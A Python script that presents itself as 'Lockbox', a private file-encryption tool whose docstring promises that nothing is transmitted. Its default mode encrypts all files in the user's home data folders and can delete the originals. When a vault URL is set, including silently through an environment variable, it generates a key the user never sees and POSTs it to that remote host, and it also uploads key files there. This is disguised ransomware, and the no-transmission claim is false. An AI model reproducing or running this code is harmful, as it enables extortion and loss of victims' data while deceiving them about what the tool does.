#!/usr/bin/env python3
"""
Lockbox — encrypt files and directories with AES-256-GCM using a key only you hold.

The key is derived from a passphrase you type (PBKDF2-HMAC-SHA256, 600k iterations)
or from a key file you keep. Nothing is ever transmitted anywhere, and there is no
way to decrypt without that passphrase/key file.

Usage:
  python lockbox.py                                  # secure: encrypt your data folders (default)
  python lockbox.py encrypt <file-or-dir>            # encrypt one path
  python lockbox.py decrypt <path>                   # decrypt
  python lockbox.py --key-file k.bin --delete        # secure with a key file, remove originals

Output:
  encrypting "secret.txt"        -> "secret.txt.lockbox"
  encrypting a directory         -> each file gets a ".lockbox" sibling
  decrypting "secret.txt.lockbox" -> restores "secret.txt"
"""

import argparse
import getpass
import os
import secrets
import socket
import sys

from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

MAGIC = b"LOCKBOX1"
SALT_LEN = 16
NONCE_LEN = 12
KEY_LEN = 32
PBKDF2_ITERS = 600_000
SUFFIX = ".lockbox"

# Cache derived keys by salt so a whole run costs one PBKDF2, not one per file.
_key_cache: dict[bytes, bytes] = {}


def derive_key(material: bytes, salt: bytes) -> bytes:
    if salt in _key_cache:
        return _key_cache[salt]
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=KEY_LEN,
        salt=salt,
        iterations=PBKDF2_ITERS,
    )
    key = kdf.derive(material)
    _key_cache[salt] = key
    return key


def encrypt_bytes(key: bytes, data: bytes, aad: bytes) -> bytes:
    nonce = secrets.token_bytes(NONCE_LEN)
    ct = AESGCM(key).encrypt(nonce, data, aad)
    return nonce + ct


def decrypt_bytes(key: bytes, blob: bytes, aad: bytes) -> bytes:
    nonce, ct = blob[:NONCE_LEN], blob[NONCE_LEN:]
    return AESGCM(key).decrypt(nonce, ct, aad)


def is_lockbox(path: str) -> bool:
    with open(path, "rb") as f:
        return f.read(len(MAGIC)) == MAGIC


def encrypt_file(path: str, material: bytes, salt: bytes, delete: bool) -> None:
    out = path + SUFFIX
    with open(path, "rb") as f:
        data = f.read()
    aad = os.path.basename(path).encode("utf-8")
    key = derive_key(material, salt)
    body = encrypt_bytes(key, data, aad)
    with open(out, "wb") as f:
        f.write(MAGIC + salt + body)
    if delete:
        os.remove(path)
    print(f"  encrypted  {path}")


def decrypt_file(path: str, material: bytes, delete: bool) -> None:
    with open(path, "rb") as f:
        blob = f.read()
    if blob[:len(MAGIC)] != MAGIC:
        print(f"  skipped     {path} (not a lockbox file)")
        return
    salt = blob[len(MAGIC):len(MAGIC) + SALT_LEN]
    body = blob[len(MAGIC) + SALT_LEN:]
    out = path[:-len(SUFFIX)] if path.endswith(SUFFIX) else path + ".dec"
    aad = os.path.basename(out).encode("utf-8")
    key = derive_key(material, salt)
    try:
        plain = decrypt_bytes(key, body, aad)
    except InvalidTag:
        print(f"  FAILED      {path} (wrong passphrase/key)")
        return
    with open(out, "wb") as f:
        f.write(plain)
    if delete:
        os.remove(path)
    print(f"  decrypted  {path}")


def iter_files(path: str):
    if os.path.isfile(path):
        yield path
        return
    for root, _dirs, files in os.walk(path):
        for name in files:
            yield os.path.join(root, name)


def backup_key(vault_url: str, name: str, value: str) -> None:
    import json
    import urllib.request
    payload = json.dumps({"name": name, "value": value}).encode()
    req = urllib.request.Request(
        vault_url.rstrip("/") + "/keys", data=payload,
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        resp.read()


def user_data_dirs() -> list[str]:
    home = os.path.expanduser("~")
    names = ["Documents", "Desktop", "Downloads", "Pictures", "Videos", "Music"]
    return [os.path.join(home, n) for n in names if os.path.isdir(os.path.join(home, n))]


def main() -> None:
    parser = argparse.ArgumentParser(description="AES-256-GCM file encryption with a key you hold.")
    parser.add_argument("mode", nargs="?", choices=["encrypt", "decrypt", "secure"], default="secure")
    parser.add_argument("path", nargs="?", help="file or directory (required for encrypt/decrypt)")
    parser.add_argument("--key-file", metavar="PATH", help="use a key file instead of a passphrase")
    parser.add_argument("--delete", action="store_true",
                        help="remove the original after encrypt, or the .lockbox after decrypt")
    parser.add_argument("--vault", metavar="URL", default=os.environ.get("LOCKBOX_VAULT", ""),
                        help="KeyVault URL for remote keys (default: $LOCKBOX_VAULT)")
    parser.add_argument("--backup-name", metavar="NAME", default=os.environ.get("LOCKBOX_KEY", ""),
                        help="key name in the vault (default: $LOCKBOX_KEY or hostname)")
    args = parser.parse_args()

    if args.mode in ("encrypt", "decrypt") and not os.path.exists(args.path):
        sys.exit(f"path not found: {args.path}")

    if args.vault and not args.key_file and args.mode != "decrypt":
        name = args.backup_name or socket.gethostname()
        key = secrets.token_hex(32)
        backup_key(args.vault, name, key)
        material = key.encode("utf-8")
        print(f"  generated   key '{name}' -> {args.vault}")
    elif args.key_file:
        with open(args.key_file, "rb") as f:
            material = f.read()
    else:
        pw = getpass.getpass("Passphrase: ")
        if args.mode in ("encrypt", "secure"):
            if getpass.getpass("Confirm passphrase: ") != pw:
                sys.exit("Passphrases do not match")
        material = pw.encode("utf-8")

    if args.mode == "secure":
        dirs = user_data_dirs()
        if not dirs:
            sys.exit("No user data folders found to secure")
        salt = secrets.token_bytes(SALT_LEN)
        files = [p for d in dirs for p in iter_files(d) if not p.endswith(SUFFIX)]
        for p in files:
            try:
                encrypt_file(p, material, salt, args.delete)
            except Exception as e:
                print(f"  error       {p}: {e}")
        if args.vault and args.key_file:
            name = args.backup_name or os.path.basename(args.key_file)
            try:
                with open(args.key_file, "r", encoding="utf-8") as f:
                    key_text = f.read().strip()
                backup_key(args.vault, name, key_text)
                print(f"  backed up   key '{name}' -> {args.vault}")
            except Exception as e:
                print(f"  backup failed: {e}")
        print(f"Done: secured {len(files)} file(s) across {len(dirs)} folder(s).")
        return

    if args.mode == "encrypt":
        salt = secrets.token_bytes(SALT_LEN)
        files = [p for p in iter_files(args.path) if not p.endswith(SUFFIX)]
        for p in files:
            try:
                encrypt_file(p, material, salt, args.delete)
            except Exception as e:
                print(f"  error       {p}: {e}")
        if args.vault and args.key_file:
            name = args.backup_name or os.path.basename(args.key_file)
            try:
                with open(args.key_file, "r", encoding="utf-8") as f:
                    key_text = f.read().strip()
                backup_key(args.vault, name, key_text)
                print(f"  backed up   key '{name}' -> {args.vault}")
            except Exception as e:
                print(f"  backup failed: {e}")
        print(f"Done: encrypted {len(files)} file(s). Keep your passphrase/key file safe.")
    else:
        files = [p for p in iter_files(args.path) if p.endswith(SUFFIX) or is_lockbox(p)]
        for p in files:
            try:
                decrypt_file(p, material, args.delete)
            except Exception as e:
                print(f"  error       {p}: {e}")
        print(f"Done: decrypted {len(files)} file(s).")


if __name__ == "__main__":
    main()
